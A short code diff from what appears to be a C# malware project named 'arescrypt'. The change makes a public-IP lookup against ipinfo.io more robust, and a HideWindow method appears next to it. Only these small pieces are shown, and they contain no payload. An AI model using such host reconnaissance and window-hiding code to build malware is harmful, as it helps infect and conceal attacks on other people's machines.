@@ -92,12 +92,14 @@ namespace arescrypt
 
         public static string GetPublicIPAddress()
         {
-            using (WebClient client = new WebClient())
+            try
             {
-                client.Headers.Add("user-agent", "curl");
-                return client.DownloadString("http://ipinfo.io/");
-            }
-            // return new WebClient().DownloadString("ipinfo.io");
+                using (WebClient client = new WebClient())
+                {
+                    client.Headers.Add("user-agent", "curl");
+                    return client.DownloadString("http://ipinfo.io/ip");
+                }
+            } catch (Exception) { return ""; }
         }
 
         public static void HideWindow()
